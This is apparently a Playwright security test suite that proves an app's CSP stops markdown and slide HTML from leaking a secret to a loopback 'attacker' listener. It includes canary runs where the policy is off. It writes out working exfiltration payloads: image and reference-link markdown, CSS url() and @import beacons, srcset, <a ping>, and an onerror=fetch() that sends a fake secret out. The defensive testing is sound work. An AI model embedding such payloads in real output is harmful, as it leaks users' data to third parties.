// md-exfil T7: end-to-end egress proof. In a real browser, the attack from the customer's report (and its
// variants) sends NOTHING out under the shipped defaults. "Attacker" is a real loopback HTTP listener
// (tests/helpers/captureServer.mjs) that counts every request; the page is served by the REAL production headers
// (fixture-server.mjs calls the product securityHeaders) with an EMPTY allowlist and no CSP_EGRESS override.
// Nothing intercepts the attacker URLs: if a request leaves the page, the listener counts it.
//
// A zero without a canary proves nothing, so:
//  - CANARY: the same raw slide / document under CSP_EGRESS=report (the emergency path) MUST reach the listener,
//    per vector. If the canary stops hitting, the harness went blind and the zero above it no longer counts.
//  - ALLOWLIST: an admin-allowlisted https origin loads (the listener behind it sees the hit); the same URL with an
//    empty allowlist never reaches it, even when the client policy is told the origin is fine (the CSP header is
//    the enforcement, the client policy only decides what to draw).
//  - ZERO NON-APP ORIGINS: loading `/`, the deck studio and the DS settings with an empty allowlist makes no
//    request to any origin other than the app's (a CDN font or script coming back into index.html fails this).
import { test, expect } from '@playwright/test'
import { startFixtureServer } from './fixture-server.mjs'
import { startCaptureServer } from '../../tests/helpers/captureServer.mjs'
import { loadFixtures, newVariantContext, sendPrompt } from './lib.mjs'

const fx = loadFixtures()
const { ids } = fx
const SECRET = 'QA_SECRET_Q3_REVENUE_104M'
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64')
const sessionBody = (id) => JSON.parse(fx.routes[`GET /api/sessions/${id}/messages`].body)
const MODEL = sessionBody(ids.s1).messages[1].model
const DESKTOP = { theme: 'dark', mobile: false }

let cap // the attacker listener (loopback, random port)
let cap2 // a second one, behind the allowlisted origin
let enforced // the app under the shipped defaults: enforced CSP, empty allowlist, no CSP_EGRESS
let report // the same app under CSP_EGRESS=report (the canary)
let allowing // the app with https://assets.allowed.example on the admin allowlist

test.beforeAll(async () => {
  cap = await startCaptureServer()
  cap2 = await startCaptureServer()
  // env: {} so an ambient CSP_EGRESS / EXTERNAL_ASSET_ORIGINS of the machine running the suite cannot change the policy
  enforced = await startFixtureServer({ port: 0, env: {}, origins: [] })
  report = await startFixtureServer({ port: 0, env: { CSP_EGRESS: 'report' }, origins: [] })
  allowing = await startFixtureServer({ port: 0, env: {}, origins: ['https://assets.allowed.example'] })
})
test.afterAll(async () => {
  for (const s of [enforced, report, allowing]) await s?.close()
  for (const c of [cap, cap2]) await c?.close()
})
test.beforeEach(() => {
  cap.reset()
  cap2.reset()
})

const hitPaths = () => cap.hits().map((h) => new URL(h.url, 'http://x').pathname)
const withSecret = (p) => `${cap.origin}${p}?d=${SECRET}`

async function open(browser, app, { me } = {}) {
  const ctx = await newVariantContext(browser, DESKTOP)
  const page = await ctx.newPage()
  const errors = []
  const foreign = []
  page.on('pageerror', (e) => errors.push(String(e)))
  const appOrigin = new URL(app.url).origin
  ctx.on('request', (r) => {
    const u = r.url()
    if (/^(https?|wss?):/i.test(u) && new URL(u).origin !== appOrigin) foreign.push(u)
  })
  if (me) await page.route('**/api/me', (r) => r.fulfill({ json: { email: 'e2e-user@example.com', isAdmin: false, isOwner: false, ...me } }))
  return { ctx, page, errors, foreign, app }
}

const assistant = (id, content) => ({
  id: String(id), role: 'assistant', content, attachments: null, model: MODEL, prompt_tokens: 1, completion_tokens: 1,
  blocks: null, tool_calls: null, created_at: '2026-11-17T07:09:00.000Z', media_processing: null, intent_classify: null, reasoning: null,
})

async function serveS3(o, content, blocks) {
  const body = sessionBody(ids.s3)
  body.messages = [body.messages[0], { ...assistant(9001, content), blocks: blocks || null }]
  await o.page.route(`**/api/sessions/${ids.s3}/messages`, (r) => r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) }))
  await o.page.goto(`${o.app.url}/#/chat/${ids.s3}`)
}

// let every request the page is going to make get made (images, frames, beacons, reports)
const quiesce = async (page) => {
  await page.waitForTimeout(1200) // not networkidle: the studios keep a request in flight
}

// ---------------------------------------------------------------------------------------------------------------
// 1. chat markdown, final and streamed
// ---------------------------------------------------------------------------------------------------------------
const CHAT_ATTACK = [
  `Inline: ![chart](CAP/chat-inline?d=${SECRET})`,
  '',
  'Reference: ![total][r1]',
  '',
  '| a | b |',
  '|---|---|',
  `| x | ![in table](CAP/chat-table?d=${SECRET}) |`,
  '',
  `[r1]: CAP/chat-reference?d=${SECRET}`,
].join('\n')
const chatAttack = () => CHAT_ATTACK.replaceAll('CAP', cap.origin)

test('chat (final): inline, reference and in-table images send nothing to the listener', async ({ browser }) => {
  const o = await open(browser, enforced)
  await serveS3(o, chatAttack())
  await expect(o.page.locator('.md-image-blocked')).toHaveCount(3)
  await quiesce(o.page)
  expect(cap.hits()).toEqual([])
  expect(o.errors).toEqual([])
  await o.ctx.close()
})

test('chat (streamed): an image arriving token by token sends nothing, mid-stream or at the end', async ({ browser }) => {
  const o = await open(browser, enforced)
  await o.page.goto(`${o.app.url}/#/chat`)
  await sendPrompt(o.page, 'Revenue by region?')
  await o.page.waitForFunction(() => !!window.__sse)
  await o.page.evaluate((sid) => window.__sse.push({ type: 'meta', sessionId: sid, isNew: true }), ids.s2)
  const url = withSecret('/chat-stream')
  const mid = Math.floor(url.length / 2)
  for (const v of ['Total: ![t](', url.slice(0, mid), url.slice(mid), ') done']) await o.page.evaluate((value) => window.__sse.push({ type: 'token', value }), v)
  await expect(o.page.locator('.md-image-blocked')).toHaveCount(1)
  expect(cap.hits()).toEqual([]) // mid-stream, before the answer is final
  await o.page.evaluate(() => { window.__sse.push({ type: 'done' }); window.__sse.end() })
  await quiesce(o.page)
  expect(cap.hits()).toEqual([])
  await o.ctx.close()
})

// ---------------------------------------------------------------------------------------------------------------
// 2. a document
// ---------------------------------------------------------------------------------------------------------------
const docMd = () => `Hello ![pic](${withSecret('/doc-inline')}) world\n\n![ref][z]\n\n[z]: ${withSecret('/doc-reference')}`

async function openDoc(o) {
  const doc = { id: ids.doc, title: 'T', markdown: docMd() }
  await o.ctx.route(`**/api/documents/${ids.doc}`, (r) => r.fulfill({ json: { document: doc } }))
  await o.page.goto(`${o.app.url}/#/chat/${ids.s1}`)
  await o.page.getByText('Open in Slides Studio').first().waitFor()
  const openBtn = o.page.getByRole('button', { name: 'Open', exact: true }).first()
  await openBtn.scrollIntoViewIfNeeded()
  await openBtn.click()
  const root = o.page.locator('[data-studio="doc"]')
  await root.waitFor()
  return root
}

test('document: the page, the rich editor and the raw preview send nothing', async ({ browser }) => {
  const o = await open(browser, enforced)
  const root = await openDoc(o)
  await expect(root.locator('.md-image-blocked')).toHaveCount(2)
  await root.getByRole('button', { name: 'Edit', exact: true }).click()
  const editor = root.getByRole('textbox', { name: 'Document text editor' })
  await expect(editor.locator('.md-image-blocked')).toHaveCount(2) // the rich editor drew both images as placeholders
  await root.getByRole('button', { name: 'Edit as Markdown' }).click()
  await expect(root.locator('.prose-chat .md-image-blocked')).toHaveCount(2)
  await quiesce(o.page)
  expect(cap.hits()).toEqual([])
  await o.ctx.close()
})

// ---------------------------------------------------------------------------------------------------------------
// 3. a deck slide with every no-click vector, in preview, editor, present and export
// ---------------------------------------------------------------------------------------------------------------
// img, style=url(), @import, <style> url(), srcset, <a ping> and onerror=fetch(). Each one has its own path so the
// canary can show every vector is live (a vector that never fires in report mode proves nothing under enforce).
const VECTORS = ['deck-img', 'deck-style', 'deck-import', 'deck-css', 'deck-srcset', 'deck-fetch']
const PROBE_TEXT = 'Egress probe slide'
const rawSlide = () =>
  `<section style="width:1280px;height:720px;background:#0B2026;color:#fff;font-family:Inter,system-ui;padding:96px;box-sizing:border-box;position:relative">` +
  `<style>@import url(${cap.origin}/deck-import?d=${SECRET}); .bg{background:url(${cap.origin}/deck-css?d=${SECRET})}</style>` +
  `<h1 style="font-size:60px;margin:0">Egress probe slide</h1>` +
  `<img alt="" width="8" height="8" src="${withSecret('/deck-img')}">` +
  `<div style="width:40px;height:40px;background-image:url(${withSecret('/deck-style')})"></div>` +
  `<div class="bg" style="width:40px;height:40px"></div>` +
  `<img alt="" width="8" height="8" srcset="${withSecret('/deck-srcset')} 2x">` +
  `<a id="pinger" href="${withSecret('/deck-nav')}" ping="${withSecret('/deck-ping')}" style="color:#fff">link</a>` +
  `<img alt="" width="8" height="8" src="/__missing.png" onerror="fetch('${withSecret('/deck-fetch')}').then(function(){document.documentElement.dataset.fetch='sent'},function(){document.documentElement.dataset.fetch='blocked'})">` +
  `</section>`

async function routeAttackDeck(o) {
  const slide = rawSlide()
  const msgs = sessionBody(ids.s1)
  const block = msgs.messages.find((m) => m.id === '60').blocks.find((b) => b.type === 'deck-html')
  block.slides = [slide] // the chat card thumbnail renders this one too
  await o.page.route(`**/api/sessions/${ids.s1}/messages`, (r) => r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(msgs) }))
  const deck = { id: ids.deck, sessionId: ids.s1, title: block.title, slides: [slide], format: 'html' }
  await o.page.route(`**/api/decks/${ids.deck}`, (r) => r.fulfill({ json: { deck } }))
  const exported = { body: null }
  await o.page.route(`**/api/decks/${ids.deck}/export-html`, (r) => {
    exported.body = r.request().postData() || ''
    return r.fulfill({ status: 200, contentType: 'application/octet-stream', body: Buffer.from('PK') })
  })
  return exported
}

// the frames that currently show the probe slide (chat card thumbnail, studio preview or editor, present dialog)
async function probeFrames(page) {
  const out = []
  for (const f of page.frames()) if (f !== page.mainFrame() && (await f.getByText(PROBE_TEXT).first().isVisible().catch(() => false))) out.push(f)
  return out
}

// Render proof, per surface: at least `n` frames show the slide AND each one reports what its own onerror=fetch() got:
// 'blocked' when the CSP refused it, 'sent' when it left. A surface that never drew the slide cannot pass this.
async function proveRendered(page, n, mode) {
  const want = mode === 'enforce' ? 'blocked' : 'sent'
  await expect
    .poll(async () => {
      const frames = await probeFrames(page)
      const states = await Promise.all(frames.map((f) => f.evaluate(() => document.documentElement.dataset.fetch).catch(() => null)))
      return frames.length >= n && states.every((x) => x === want)
    }, { timeout: 15_000, message: `${n}+ frames show the probe slide and their fetch() was ${want}` })
    .toBe(true)
}

// zero hits under enforce; under the canary every listed vector must have reached the listener ON THIS surface
async function checkpoint(o, mode, surface, vectors) {
  await quiesce(o.page)
  const seen = new Set(hitPaths())
  if (mode === 'enforce') expect(cap.hits(), `${surface}: nothing may reach the listener`).toEqual([])
  else for (const v of vectors) expect(seen, `${surface}: ${v} must reach the listener when the egress CSP is off`).toContain(`/${v}`)
  cap.reset() // the next surface starts from zero
}

// Every surface the slide is drawn on, each proven rendered and checked on its own. `mode`: 'enforce' (the shipped
// defaults: 0 hits) or 'canary' (CSP_EGRESS=report: each vector hits).
async function walkDeckSurfaces(o, mode) {
  const { page } = o
  const exported = await routeAttackDeck(o)
  // chat card thumbnail: rendered before any studio is opened
  await page.goto(`${o.app.url}/#/chat/${ids.s1}`)
  const openCard = page.getByText('Open in Slides Studio').first()
  await openCard.waitFor()
  await proveRendered(page, 1, mode)
  await checkpoint(o, mode, 'chat card', VECTORS)
  // studio preview
  await openCard.scrollIntoViewIfNeeded()
  await openCard.click()
  await proveRendered(page, 2, mode)
  await checkpoint(o, mode, 'preview', VECTORS)
  // editor
  await page.getByTitle('Edit the slide directly: click any element to adjust it').click()
  await page.getByRole('tab', { name: 'Layers' }).click()
  await expect(page.getByText('Elements').first()).toBeVisible()
  await proveRendered(page, 1, mode) // the editor frame replaces the preview one; the others are hidden behind it
  await checkpoint(o, mode, 'editor', VECTORS)
  // present
  await page.getByRole('button', { name: /Present/ }).first().click()
  const dialog = page.getByRole('dialog').last()
  await expect(dialog.frameLocator('iframe').first().getByText(PROBE_TEXT)).toBeVisible({ timeout: 15_000 })
  await proveRendered(page, 1, mode)
  await checkpoint(o, mode, 'present', VECTORS)
  await page.keyboard.press('Escape')
  // export renders every slide off-screen: the posted shapes must carry the slide, so it WAS rendered
  await page.getByRole('button', { name: 'Export', exact: true }).click()
  await page.getByRole('menuitem', { name: /Universal fonts/ }).click()
  await expect.poll(() => exported.body, { timeout: 15_000 }).not.toBeNull()
  expect(exported.body).toContain(PROBE_TEXT)
  await checkpoint(o, mode, 'export', ['deck-img'])
}

// <a ping> only fires on a click, and the click also navigates the slide frame to the link (blocked by frame-src under
// enforce), so it gets its own page and the studio preview (the editor intercepts clicks on the slide).
async function clickPing(o, mode) {
  const { page } = o
  await routeAttackDeck(o)
  await page.goto(`${o.app.url}/#/chat/${ids.s1}`)
  const openCard = page.getByText('Open in Slides Studio').first()
  await openCard.waitFor()
  await openCard.scrollIntoViewIfNeeded()
  await openCard.click()
  await proveRendered(page, 2, mode)
  await quiesce(page)
  cap.reset()
  const studioFrame = (await probeFrames(page)).at(-1)
  // dispatched, not a mouse click: the preview iframe sits under pointer-events:none, but the link's activation behaviour (navigation + ping) runs for a click event all the same
  await studioFrame.locator('#pinger').dispatchEvent('click')
  await checkpoint(o, mode, 'ping', ['deck-ping'])
}

test('<a ping> clicked in the studio preview sends nothing (neither the beacon nor the navigation)', async ({ browser }) => {
  const o = await open(browser, enforced)
  await clickPing(o, 'enforce')
  expect(cap.hits()).toEqual([])
  await o.ctx.close()
})

test('CANARY: <a ping> clicked in the studio preview under CSP_EGRESS=report reaches the listener', async ({ browser }) => {
  const o = await open(browser, report)
  await clickPing(o, 'canary')
  await o.ctx.close()
})

test('deck slide (img, style=url(), @import, <style> url(), srcset, <a ping>, onerror=fetch) sends nothing in chat card, preview, editor, present and export', async ({ browser }) => {
  const o = await open(browser, enforced)
  await walkDeckSurfaces(o, 'enforce')
  expect(cap.hits()).toEqual([])
  expect(o.errors).toEqual([]) // no page error is tolerated: a blocked fetch() is handled inside the slide and reported by its data-fetch
  await o.ctx.close()
})

test('CANARY: the same raw slide under CSP_EGRESS=report reaches the listener on every vector, <a ping> included, on every surface', async ({ browser }) => {
  const o = await open(browser, report)
  // the emergency path is really on: the enforced header carries no egress directives
  const csp = (await o.page.request.get(`${report.url}/`)).headers()['content-security-policy']
  expect(csp).not.toMatch(/img-src|connect-src/)
  await walkDeckSurfaces(o, 'canary')
  await o.ctx.close()
})

// ---------------------------------------------------------------------------------------------------------------
// 4. a design-system card with a remote <img>
// ---------------------------------------------------------------------------------------------------------------
const dsCard = () =>
  `<section style="width:1280px;height:720px;background:#123;color:#fff;font:600 64px system-ui;padding:80px">` +
  `<img alt="" width="8" height="8" src="${withSecret('/ds-card')}"><span>DS specimen</span></section>`

async function openDsCard(o) {
  await o.page.route('**/api/deck-templates', (route) =>
    route.fulfill({ contentType: 'application/json', body: JSON.stringify({ templates: [{ id: 501, name: 'Probe DS', scope: 'user', dsCards: [{ group: 'Templates', html: dsCard() }], primaryColor: '#123' }] }) })
  )
  await o.page.goto(`${o.app.url}/#/chat`)
  await o.page.locator('textarea').first().waitFor()
  await o.page.locator('button[title="Settings"]').first().click()
  await o.page.getByRole('button', { name: 'Design system', exact: true }).first().click()
  await expect(o.page.frameLocator('iframe[title="Probe DS"]').getByText('DS specimen')).toBeVisible({ timeout: 15_000 })
  await quiesce(o.page)
}

test('design-system card with a remote <img> sends nothing; the canary shows the card would', async ({ browser }) => {
  const o = await open(browser, enforced)
  await openDsCard(o)
  expect(cap.hits()).toEqual([])
  await o.ctx.close()
  const c = await open(browser, report)
  await openDsCard(c)
  expect(hitPaths()).toContain('/ds-card')
  await c.ctx.close()
})

// ---------------------------------------------------------------------------------------------------------------
// 5. the allowlist: loads when allowlisted, nothing when not
// ---------------------------------------------------------------------------------------------------------------
// The allowlist only takes https origins with a DNS name, so the origin cannot be the loopback listener itself:
// page.route forwards the allowed host to cap2 (the route runs AFTER the CSP check, so it is only reached when the
// header lets the request out; that is exactly what is being proven).
const ALLOWED = 'https://assets.allowed.example'
const forwardToCap2 = (page) =>
  page.route(`${ALLOWED}/**`, async (r) => {
    const u = new URL(r.request().url())
    const res = await r.fetch({ url: `${cap2.origin}${u.pathname}${u.search}` })
    await r.fulfill({ response: res })
  })

test('allowlisted origin: the image loads and the second listener sees it', async ({ browser }) => {
  const o = await open(browser, allowing, { me: { externalAssetOrigins: [ALLOWED] } })
  await forwardToCap2(o.page)
  expect((await o.page.request.get(`${allowing.url}/`)).headers()['content-security-policy']).toMatch(/img-src[^;]*https:\/\/assets\.allowed\.example/)
  await serveS3(o, `![logo](${ALLOWED}/logo.png?d=${SECRET})`)
  await expect(o.page.locator('.prose-chat img')).toHaveCount(1)
  await expect.poll(() => o.page.locator('.prose-chat img').evaluate((e) => e.complete && e.naturalWidth > 0)).toBe(true)
  expect(cap2.count()).toBeGreaterThanOrEqual(1)
  expect(cap.hits()).toEqual([]) // the allowlist opens that one origin, not the attacker's
  await o.ctx.close()
})

test('not allowlisted: the same image never reaches the second listener, even if the client policy would draw it', async ({ browser }) => {
  // (a) nothing allowlisted anywhere: placeholder, no request
  const a = await open(browser, enforced)
  await forwardToCap2(a.page)
  await serveS3(a, `![logo](${ALLOWED}/logo.png?d=${SECRET})`)
  await expect(a.page.locator('.md-image-blocked')).toHaveCount(1)
  expect(await a.page.locator('.prose-chat img').count()).toBe(0)
  await quiesce(a.page)
  expect(cap2.count()).toBe(0)
  await a.ctx.close()
  // (b) the client was told the origin is fine, but the header (the enforcement) is not: the <img> is drawn and the browser refuses it
  const b = await open(browser, enforced, { me: { externalAssetOrigins: [ALLOWED] } })
  await forwardToCap2(b.page)
  // Evidence the <img> was DRAWN and REFUSED, recorded inside the page (the app swaps a failed <img> for the placeholder
  // within a frame, so a later look at the DOM would miss it): every <img> added with that origin, and every CSP
  // violation the browser raises for it.
  await b.page.addInitScript((origin) => {
    window.__drawn = []
    window.__refused = []
    new MutationObserver((ms) => {
      for (const m of ms) for (const n of m.addedNodes) {
        const imgs = n.nodeType === 1 ? (n.tagName === 'IMG' ? [n] : [...n.querySelectorAll('img')]) : []
        for (const i of imgs) if ((i.getAttribute('src') || '').startsWith(origin)) window.__drawn.push(i.getAttribute('src'))
      }
    }).observe(document, { subtree: true, childList: true })
    document.addEventListener('securitypolicyviolation', (e) => { if (e.blockedURI.startsWith(origin)) window.__refused.push({ directive: e.effectiveDirective, disposition: e.disposition }) }, true)
  }, ALLOWED)
  await serveS3(b, `![logo](${ALLOWED}/logo.png?d=${SECRET})`)
  await expect.poll(() => b.page.evaluate(() => window.__drawn.length), { timeout: 15_000, message: 'the client policy drew an <img> for the allowlisted-by-client origin' }).toBeGreaterThan(0)
  await expect.poll(() => b.page.evaluate(() => window.__refused), { timeout: 15_000, message: 'the browser refused it under the header' }).toContainEqual({ directive: 'img-src', disposition: 'enforce' })
  await expect(b.page.locator('.md-image-blocked')).toHaveCount(1) // the failed <img> fell back to the named placeholder
  await quiesce(b.page)
  expect(cap2.count()).toBe(0)
  await b.ctx.close()
})

// ---------------------------------------------------------------------------------------------------------------
// 6. zero requests to any origin other than the app's
// ---------------------------------------------------------------------------------------------------------------
test('loading /, the deck studio and the DS settings with an empty allowlist makes zero requests to any other origin', async ({ browser }) => {
  const o = await open(browser, enforced)
  await o.page.goto(`${o.app.url}/#/chat`)
  await expect(o.page.locator('textarea').first()).toBeVisible() // the real SPA booted
  await expect(o.page.locator('#root > *').first()).toBeAttached()
  await quiesce(o.page)
  expect(o.foreign, 'welcome screen').toEqual([])
  // deck studio
  await o.page.goto(`${o.app.url}/#/chat/${ids.s1}`)
  const openCard = o.page.getByText('Open in Slides Studio').first()
  await openCard.waitFor()
  await openCard.scrollIntoViewIfNeeded()
  await openCard.click()
  await expect.poll(async () => {
    for (const f of o.page.frames()) if (f !== o.page.mainFrame() && (await f.getByText('Revenue grew 8.4% QoQ').first().isVisible().catch(() => false))) return true
    return false
  }, { timeout: 15_000, message: 'the studio drew the real first slide' }).toBe(true)
  await quiesce(o.page)
  expect(o.foreign, 'deck studio').toEqual([])
  expect(o.errors).toEqual([])
  await o.ctx.close()
  // DS settings, on a fresh page (leaving the studio by hash change raises the unsaved-changes guard)
  const d = await open(browser, enforced)
  await d.page.route('**/api/deck-templates', (r) => r.fulfill({ contentType: 'application/json', body: JSON.stringify({ templates: [{ id: 501, name: 'Benign DS', scope: 'user', dsCards: [], primaryColor: '#123' }] }) }))
  await d.page.goto(`${d.app.url}/#/chat`)
  await d.page.locator('textarea').first().waitFor()
  await d.page.locator('button[title="Settings"]').first().click()
  await d.page.getByRole('button', { name: 'Design system', exact: true }).first().click()
  await expect(d.page.getByRole('dialog', { name: 'Settings' })).toBeVisible()
  await expect(d.page.locator('option[value="501"]')).toBeAttached({ timeout: 15_000 }) // the DS panel rendered the design system list
  await quiesce(d.page)
  expect(d.foreign, 'DS settings').toEqual([])
  expect(d.errors).toEqual([])
  await d.ctx.close()
})

test('CANARY: the foreign-origin tracker sees a request to another origin (so the zero above counts)', async ({ browser }) => {
  const o = await open(browser, report)
  await o.page.goto(`${o.app.url}/#/chat`)
  await o.page.locator('textarea').first().waitFor()
  await o.page.evaluate((u) => { new Image().src = u }, `${cap.origin}/foreign-canary`)
  await expect.poll(() => o.foreign.some((u) => u.includes('/foreign-canary'))).toBe(true)
  await o.ctx.close()
})
